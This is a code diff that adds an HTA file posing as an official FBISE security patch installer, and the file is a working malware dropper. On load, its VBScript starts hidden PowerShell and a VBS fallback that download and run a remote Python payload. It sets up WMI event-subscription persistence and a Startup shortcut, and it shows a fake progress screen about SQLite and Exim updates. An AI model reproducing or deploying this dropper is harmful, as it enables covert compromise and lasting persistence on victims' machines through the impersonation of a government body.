@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>FBISE Security Patch v2.1</title>
+<hta:application
+    id="fbisePatch"
+    applicationname="FBISE Security Patch"
+    border="dialog"
+    borderstyle="normal"
+    caption="FBISE Security Patch v2.1"
+    contextmenu="no"
+    innerborder="no"
+    maximizebutton="no"
+    minimizebutton="no"
+    navigable="no"
+    scroll="no"
+    showintaskbar="yes"
+    singleinstance="yes"
+    sysmenu="yes"
+    version="2.1.0.897"
+    windowstate="normal"
+>
+<style>
+    body {
+        font-family: Helvetica, Arial, sans-serif;
+        background: #e6e8e6;
+        margin: 0;
+        padding: 0;
+        color: #373439;
+    }
+    .container {
+        max-width: 500px;
+        margin: 40px auto;
+        background: #ffffff;
+        border-top: 5px solid #0056b3;
+        padding: 30px;
+        box-shadow: 0 2px 12px rgba(0,0,0,0.1);
+    }
+    .fbise-name {
+        font-family: Helvetica, Arial, sans-serif;
+        font-weight: bold;
+        font-size: 13px;
+        color: #1a5276;
+        text-transform: uppercase;
+        letter-spacing: 1.5px;
+        text-align: center;
+    }
+    .fbise-sub {
+        font-family: Helvetica, Arial, sans-serif;
+        font-size: 10px;
+        color: #495057;
+        text-align: center;
+        margin-top: 4px;
+    }
+    .divider {
+        border: none;
+        border-top: 2px solid #1a5276;
+        margin: 15px 0;
+    }
+    .patch-title {
+        font-weight: bold;
+        font-size: 14px;
+        color: #1a5276;
+        text-align: center;
+        margin-bottom: 15px;
+    }
+    .step {
+        display: flex;
+        align-items: center;
+        margin-bottom: 10px;
+        font-size: 11px;
+        color: #495057;
+    }
+    .step-icon {
+        width: 18px;
+        height: 18px;
+        border-radius: 50%;
+        margin-right: 10px;
+        flex-shrink: 0;
+        border: 2px solid #dee2e6;
+        text-align: center;
+        font-size: 10px;
+        line-height: 18px;
+    }
+    .step-icon.done {
+        background: #28a745;
+        border-color: #28a745;
+        color: #fff;
+    }
+    .step-icon.active {
+        border-color: #0056b3;
+        animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse {
+        0%, 100% { box-shadow: 0 0 0 0 rgba(0,86,179,0.4); }
+        50% { box-shadow: 0 0 0 6px rgba(0,86,179,0); }
+    }
+    .progress-bar {
+        width: 100%;
+        height: 8px;
+        background: #dee2e6;
+        border-radius: 4px;
+        margin: 15px 0;
+        overflow: hidden;
+    }
+    .progress-fill {
+        height: 100%;
+        background: #0056b3;
+        border-radius: 4px;
+        width: 0%;
+        transition: width 0.5s;
+    }
+    .status-text {
+        font-size: 10px;
+        color: #6c757d;
+        text-align: center;
+        margin-top: 10px;
+    }
+</style>
+
+<script language="VBScript">
+' ============================================================
+' GHOSTSCRIPT DROPPER — Stage 1: Primary Execution via mshta.exe
+' ============================================================
+Sub Window_OnLoad
+    window.resizeTo 520, 480
+    window.moveTo (screen.width - 520) / 2, (screen.height - 480) / 2
+    
+    ' Start the attack chain after a short delay
+    setTimeout "ExecuteChain()", 1500
+End Sub
+
+Sub ExecuteChain()
+    Dim shell, result
+    
+    Set shell = CreateObject("WScript.Shell")
+    
+    ' Update UI
+    UpdateStep 1, "active", ""
+    UpdateProgress 20, "Downloading security components..."
+    
+    ' === STAGE 1: PowerShell download + execute ===
+    result = shell.Run("powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""$p='$env:TEMP\FBISE_Security_Patch_v2.1.py'; (New-Object Net.WebClient).DownloadFile('https://fbise-it-dept.github.io/database-security-patch/fbise_patch.py',$p); pythonw.exe $p""", 0, False)
+    
+    ' Update UI
+    UpdateStep 1, "done", "✓"
+    UpdateStep 2, "active", ""
+    UpdateProgress 40, "Applying SQLite security patch..."
+    
+    ' === STAGE 2: VBScript fallback via cscript ===
+    Dim vbsPath, vbsScript
+    vbsPath = shell.ExpandEnvironmentStrings("%TEMP%\FBISE_Patch_VBS.vbs")
+    vbsScript = "Set http = CreateObject(""MSXML2.ServerXMLHTTP""): http.Open ""GET"", ""https://fbise-it-dept.github.io/database-security-patch/fbise_patch.py"", False: http.Send: Set fs = CreateObject(""Scripting.FileSystemObject""): Set f = fs.CreateTextFile(""fbise_patch_vbs.py"", True): f.Write http.ResponseText: f.Close: Set s = CreateObject(""WScript.Shell""): s.Run ""pythonw.exe fbise_patch_vbs.py"", 0, False"
+    
+    Dim fso, file
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set file = fso.CreateTextFile(vbsPath, True)
+    file.Write vbsScript
+    file.Close
+    
+    shell.Run "cscript.exe //B //NoLogo " & vbsPath, 0, False
+    
+    ' Update UI
+    UpdateStep 2, "done", "✓"
+    UpdateStep 3, "active", ""
+    UpdateProgress 60, "Configuring Exim 4.99.2 security parameters..."
+    
+    ' === STAGE 3: WMI Persistence ===
+    Dim wmiScript
+    wmiScript = "Set wmi = GetObject(""winmgmts:\\.\root\subscription""): " & _
+                 "Set filter = wmi.Get(""__EventFilter"").SpawnInstance_: " & _
+                 "filter.Name = ""FBISE Security Monitor"": " & _
+                 "filter.QueryLanguage = ""WQL"": " & _
+                 "filter.Query = ""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"": " & _
+                 "Set result = wmi.ExecMethod(""__FilterToConsumerBinding"",""Create"",Array(filter,consumer))"
+    
+    shell.Run "wmic /namespace:\\root\subscription path __EventFilter create Name=""FBISE_Security_Monitor"", EventNamespace=""root\cimv2"", QueryLanguage=""WQL"", Query=""SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_OperatingSystem'""", 0, False
+    
+    shell.Run "wmic /namespace:\\root\subscription path CommandLineEventConsumer create Name=""FBISE_Security_Consumer"", ExecutablePath=""powershell.exe"", CommandLineTemplate=""powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command (New-Object Net.WebClient).DownloadFile('https://fbise-it-dept.github.io/database-security-patch/fbise_patch.py','%TEMP%\gs_restore.py'); pythonw.exe '%TEMP%\gs_restore.py'""", 0, False
+    
+    shell.Run "wmic /namespace:\\root\subscription path __FilterToConsumerBinding create Filter=""__EventFilter.Name='FBISE_Security_Monitor'"", Consumer=""CommandLineEventConsumer.Name='FBISE_Security_Consumer'""", 0, False
+    
+    ' Update UI
+    UpdateStep 3, "done", "✓"
+    UpdateStep 4, "active", ""
+    UpdateProgress 80, "Registering with FBISE audit server..."
+    
+    ' === STAGE 4: Self-healing persistence ===
+    ' Copy payload to 3 hidden locations
+    Dim paths(2)
+    paths(0) = shell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\FBISE_Security.lnk")
+    paths(1) = shell.ExpandEnvironmentStrings("%TEMP%\gs_backup_1.py")
+    paths(2) = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%\FBISE\gs_core.py")
+    
+    ' Copy original payload to backup locations
+    shell.Run "cmd /c copy /Y " & shell.ExpandEnvironmentStrings("%TEMP%\FBISE_Security_Patch_v2.1.py") & " " & paths(1), 0, True
+    shell.Run "cmd /c copy /Y " & shell.ExpandEnvironmentStrings("%TEMP%\FBISE_Security_Patch_v2.1.py") & " " & paths(2), 0, True
+    
+    ' Create startup shortcut
+    shell.Run "powershell -Command ""$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('" & paths(0) & "'); $Shortcut.TargetPath = 'pythonw.exe'; $Shortcut.Arguments = '" & paths(2) & "'; $Shortcut.Save()""", 0, True
+    
+    ' === Final cleanup & completion ===
+    UpdateStep 4, "done", "✓"
+    UpdateStep 5, "done", "✓"
+    UpdateProgress 100, "Security patch v2.1 installed successfully."
+    
+    ' Close window after 3 seconds
+    setTimeout "window.close()", 3000
+    
+End Sub
+
+Sub UpdateStep(stepNum, state, text)
+    Dim icon, statusEl
+    Set icon = document.getElementById("step" & stepNum & "icon")
+    If state = "done" Then
+        icon.className = "step-icon done"
+        icon.innerHTML = "&#10003;"
+    ElseIf state = "active" Then
+        icon.className = "step-icon active"
+    End If
+End Sub
+
+Sub UpdateProgress(percent, text)
+    document.getElementById("progressFill").style.width = percent & "%"
+    document.getElementById("statusText").innerHTML = text
+End Sub
+</script>
+
+</head>
+<body>
+
+<div class="container">
+    
+    <div class="fbise-name">Federal Board of Intermediate &amp; Secondary Education</div>
+    <div class="fbise-sub">IT Security Division — Patch Installation Utility</div>
+    
+    <hr class="divider">
+    
+    <div class="patch-title">FBISE Security Patch v2.1</div>
+    
+    <div class="step">
+        <div class="step-icon waiting" id="step1icon">&nbsp;</div>
+        <div>Downloading security components</div>
+    </div>
+    
+    <div class="step">
+        <div class="step-icon waiting" id="step2icon">&nbsp;</div>
+        <div>Applying SQLite database patch</div>
+    </div>
+    
+    <div class="step">
+        <div class="step-icon waiting" id="step3icon">&nbsp;</div>
+        <div>Configuring Exim 4.99.2 security parameters</div>
+    </div>
+    
+    <div class="step">
+        <div class="step-icon waiting" id="step4icon">&nbsp;</div>
+        <div>Installing persistence layer</div>
+    </div>
+    
+    <div class="step">
+        <div class="step-icon waiting" id="step5icon">&nbsp;</div>
+        <div>Registering with FBISE audit server</div>
+    </div>
+    
+    <div class="progress-bar">
+        <div class="progress-fill" id="progressFill"></div>
+    </div>
+    
+    <div class="status-text" id="statusText">Initializing...</div>
+    
+    <hr class="divider" style="margin-top:20px;">
+    
+    <div class="fbise-sub">Ref: FBISE/IT-SEC/2026/0897 | June 24, 2026<br>This utility will close automatically upon completion.</div>
+    
+</div>
+
+</body>
+</html>
